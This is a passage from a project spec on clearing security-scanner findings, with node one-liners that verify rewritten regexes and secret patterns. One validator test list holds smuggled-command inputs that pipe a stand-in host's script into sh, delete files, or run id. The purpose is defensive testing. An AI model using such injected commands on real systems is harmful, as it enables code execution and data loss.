node -e 'const safe=require(require.resolve("safe-regex",{paths:[require.resolve("eslint-plugin-security")]}));const old=/^`node scripts\/ovl\/metrics\.mjs (?:collect|report|session|due)(?: -{0,2}[A-Za-z0-9_][\w.\/:=-]*)*`$/;const ARG=/^-{0,2}[A-Za-z0-9_][\w.\/:=-]*$/;const isC=c=>{if(!c.startsWith("`")||!c.endsWith("`"))return false;const [n,s,sub,...args]=c.slice(1,-1).split(" ");return n==="node"&&s==="scripts/ovl/metrics.mjs"&&["collect","report","session","due"].includes(sub)&&args.every(x=>ARG.test(x))};const ins=["`node scripts/ovl/metrics.mjs collect ORV-91`","`node scripts/ovl/metrics.mjs report ORV-90 ORV-91 --out batch-2`","`node scripts/ovl/metrics.mjs session 22222222-2222-4222-8222-222222222222`","`node scripts/ovl/metrics.mjs due --today 2026-11-06`","`node scripts/ovl/metrics.mjs due`","`node scripts/ovl/metrics.mjs due; curl https://x.invalid/a | sh`","`node scripts/ovl/metrics.mjs due && rm -rf x`","`node scripts/ovl/metrics.mjs report $(id)`","`node scripts/ovl/metrics.mjs report ORV-1 > out`","`node scripts/ovl/metrics.mjs report ORV-1","`node scripts/ovl/metrics.mjs`","`node scripts/ovl/metrics.mjs bogus ORV-1`","x `node scripts/ovl/metrics.mjs due`","`node scripts/ovl/metrics.mjs due` and more","`npx scripts/ovl/metrics.mjs due`","`node scripts/ovl/other.mjs due`","`node scripts/ovl/metrics.mjs  due`","`node scripts/ovl/metrics.mjs due `","`"];console.log(ins.filter(c=>old.test(c)).length,ins.filter(c=>old.test(c)!==isC(c)).length,safe(String(old)),safe(String(ARG)))'
```

7. `scan-regexp-1` on the labels and titles that reach the rewritten calls, copied from `generated.ts`, the two message files, `fixtures.ts` and the call sites: how many there are, how many hold a regex metacharacter, and for how many the old `RegExp` and the new function disagree on a name that equals, starts with, ends with or holds the label. Expected output: `20 0 0`.

```bash
node -e 'const L=["จัดกลุ่ม","ทำสำเนา","วาง","ตั้งเป็นสาย reference","เปลี่ยนชื่อ","สิ่งที่อ่านได้จากบรีฟ","บรีฟ","What the brief says","โปรเจกต์ Brand Canvas ของทีม","งานภาพ","โลโก้","กลุ่ม 1","โน้ต","โปรไฟล์ว่าที่ลูกค้า","Type direction","ฟอนต์","มู้ดและธีม","สีตั้งต้น","บุคลิกแบรนด์","ไอคอน"];const meta=L.filter(x=>/[.*+?^${}()|[\]\\]/.test(x)).length;const names=L.flatMap(x=>[x,x+", node","x "+x,"x "+x+" x"]);const bad=L.filter(x=>names.some(n=>new RegExp(x).test(n)!==n.includes(x)||new RegExp("^"+x).test(n)!==n.startsWith(x)||new RegExp("^"+x+",").test(n)!==n.startsWith(x+","))).length;console.log(L.length,meta,bad)'
```

8. `scan-regexp-2`: whether the built `LATIN_WORD` and the three built `USAGE` patterns have the same source as their literals, and on how many file names the built entry pattern and `ENTRY_FILE_NAME` disagree, for both prefixes. Expected output: `true true true true 0`.

```bash
node -e 'const J=["API","endpoint","payload","JSON","null","undefined"];const w=new RegExp(`(?<![A-Za-z0-9_])(?:${J.join("|")})(?![A-Za-z0-9_])`).source===/(?<![A-Za-z0-9_])(?:API|endpoint|payload|JSON|null|undefined)(?![A-Za-z0-9_])/.source;const q=["commits","secrets","codescan"].map((n,i)=>new RegExp(`\\b${n}\\b`).source===[/\bcommits\b/,/\bsecrets\b/,/\bcodescan\b/][i].source);const N={K:/^(K-\d{4})-[a-z0-9-]+\.md$/,L:/^(L-\d{4})-[a-z0-9-]+\.md$/};const ins=["K-0088-material-color-utilities-0-4-0-quantizer-api-and-determinism.md","L-0031-knowledge-source-cited-a-session-upload.md","K-88-x.md","K-0088-Upper.md","L-0001-x.txt"];const d=["K","L"].flatMap(p=>ins.filter(s=>JSON.stringify(s.match(new RegExp(`^(${p}-\\d{4})-[a-z0-9-]+\\.md$`)))!==JSON.stringify(s.match(N[p])))).length;console.log(w,q.join(" "),d)'
```

9. `scan-regexp-3` on the real `generated.css`: per variant, the value both forms read, or `differs`. Expected output: `var(--ds-text-secondary) var(--ds-feedback-success-fg) var(--ds-feedback-warning-fg) var(--ds-feedback-danger-fg) var(--ds-feedback-info-fg) var(--ds-brand-ink)`.

```bash
node -e 'const g=require("fs").readFileSync("packages/design-system/src/tokens/generated.css","utf8");const all=[...g.matchAll(/--cmp-badge-dot-([a-z]+):\s*([^;]+);/g)];console.log(["neutral","success","warning","danger","info","brand"].map(v=>{const a=new RegExp(`--cmp-badge-dot-${v}:\\s*([^;]+);`).exec(g)?.[1];const b=all.find(m=>m[1]===v)?.[2];return a===b?a:"differs"}).join(" "))'
```

10. `scan-secret-1`: the basicauth URL pattern and placeholder list copied from the preset (lines 5331 and 5261 to 5277), on the two old forms and the two new forms, built at run time so this file holds none of them. Printed: the findings per input. The user name check passes `user` and `alice` and is left out. Expected output: `1 1 0 0`.

```bash
node -e 'const U=/(?<protocol>(?:https?|ftp|ftps)):\/\/(?<user>[-a-zA-Z0-9_]{1,256}):(?<password>[-a-zA-Z0-9_]{1,256})@[-a-zA-Z0-9%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b/g;const IGN=["localhost","127.0.0.1","password","mypassword","myusername","{password}","${password}","{{password}}","{username}","${username}","{{username}}","YOUR_PASSWORD","YOUR_USERNAME","REPLACE_WITH_PASSWORD","REPLACE_WITH_USERNAME"];const real=p=>p.length>=4&&!IGN.some(i=>p.toLowerCase().includes(i.toLowerCase()));const ins=["http://user:"+"secret@example.test/","https://alice:"+"s3cret@example.com:6379/","http://user:"+"password@example.test/","https://alice:"+"password@example.com:6379/"];console.log(ins.map(s=>[...s.matchAll(U)].filter(m=>real(m.groups.password)).length).join(" "))'
```

11. `scan-secret-2`: the PostgreSQL pattern and template patterns copied from the preset (lines 6428 and 6333 to 6340), on the old handoff URL, the new one and the CI URL of line 93, built at run time. The exact placeholder check is left out; no password here is one. Expected output: `1 0 0`.

```bash
node -e 'const P=/postgres(?:ql)?:\/\/(?:(?<username>[^:\/\s]{1,100}):(?<password>[^@\/\s]{1,200})@)?(?<host>[^\/\s?]{1,100})(?:\/(?<database>[^?\s]{0,100}))?(?:\?(?<options>[^\s]{0,500}))?/gi;const V=[/\$\{[^}]{1,50}\}/,/\{\{[^}]{1,50}\}\}/,/\{[^}]{1,50}\}/,/%[A-Z_]{1,30}%/,/\$[A-Z_]{1,30}/,/\$\([^)]{1,50}\)/];const real=(u,p)=>u!==p&&p.length>=4&&!V.some(r=>r.test(p));const pre="postgres:/"+"/";const ins=[pre+"orivilo_app:orivilo_app_test@localhost:5432/orivilo_dev",pre+"orivilo_app:{password}@localhost:5432/orivilo_dev",pre+"postgres:postgres@localhost:5432/postgres"];console.log(ins.map(s=>[...s.matchAll(P)].filter(m=>m.groups.password&&real(m.groups.username,m.groups.password)).length).join(" "))'
```

## Out of scope

- Part 2, inside PR 137: the 36 findings under `scripts/ovl/`, the removal of `--report` from `scripts/quality-gate.mjs` and `.github/workflows/ci.yml`, and the test that a new finding fails the gate. All three touch guard paths.
- `security/detect-object-injection`, which stays off, and the test and script scope in which `security/detect-non-literal-fs-filename` stays off (`eslint.security.config.mjs` lines 16 to 26).
- A credential URL the scanner does not flag: `packages/intent-engine/src/url-analyser.test.ts` lines 1469 and 1484, whose host ends in a seven-letter name the basicauth pattern does not read.
- The copies of two old regexes in other documents, `docs/specs/ORV-128/tech.md:619` (`PATH_FORM`) and `docs/specs/ORV-129/spec.md:130` (`CONFIDENCE_FORMAT`): open question 4.
- New scanner rules, a secretlint comment filter rule, and any change to `scripts/scan.mjs`.

## Open questions (option, impact, default)

1. How an override is scoped. Options: (a) one block per file in `eslint.security.config.mjs`; (b) load eslint-plugin-security in the `packages/db` and `packages/intent-engine` ESLint configs, so an inline `eslint-disable-next-line` names the one line; (c) move each flagged call into a module of its own, so the file block covers only that call. Impact: (a) hides a later finding of the same rule in `migrate.ts` or `interpreter.ts`, which the block's comment says; (b) adds the plugin to two package configs and their dependencies; (c) adds two files for three findings. **Default: (a)** (`scan-override-1`).
2. The example credentials in tests and docs. Options: the placeholder word `password`; or, in the tests, a string built at run time, such as `["user", "secret"].join(":")`. Impact: the placeholder rests on the skip list of the preset 13.0.7; if an upgrade drops it, the scan lists the lines again and, once part 2 lands, blocks, so it fails closed. A runtime string hides the URL from a reader of the test and of its `%s` test name. **Default: the placeholder** (`scan-secret-1`).
3. The edits to `docs/specs/ORV-128/spec.md`, `docs/specs/ORV-128/tech.md` and `docs/specs/ORV-133/spec.md`. Options: a version bump and a changelog line in each; or neither. Impact: the edits change example text, not a requirement. **Default: neither; this spec records the edits.**
4. The old regexes quoted in `docs/specs/ORV-128/tech.md:619` and `docs/specs/ORV-129/spec.md:130`. Options: replace them with the new forms in this PR; or leave them. Impact: each old form accepts the same strings as its new form, so both documents stay true about behaviour, and worked example 4 of ORV-129 still prints its expected line; a reader who copies an old form copies a regex the scan flags. **Default: leave both**; they record the design at its time.
5. The handoff line. Options: the `{password}` form with the value named after it; or no URL, only its parts. **Default: the `{password}` form** (`scan-secret-2`).

## Decisions it depends on

- ORV-114 comment 10256, decided under the owner's delegation (ADR 0012 decision 4): the scope of part 1, lane S, and part 2 inside PR 137 (Why, The finding set, Out of scope).
- ORV-108: the two scans, their config and report mode (`scripts/scan.mjs`, `eslint.security.config.mjs`).
- ADR 0012: lane S, G3 by Claude with evidence, G5 by the owner.
- AGENTS.md, Lanes and gates: resolver logic is a risk flag (`scan-override-1`, item 2).
- L-0012 (the guard frame), L-0025, L-0038, L-0039 and L-0041 (the shape of this spec).

## Changelog

- v1.0 (2026-10-29): first spec.
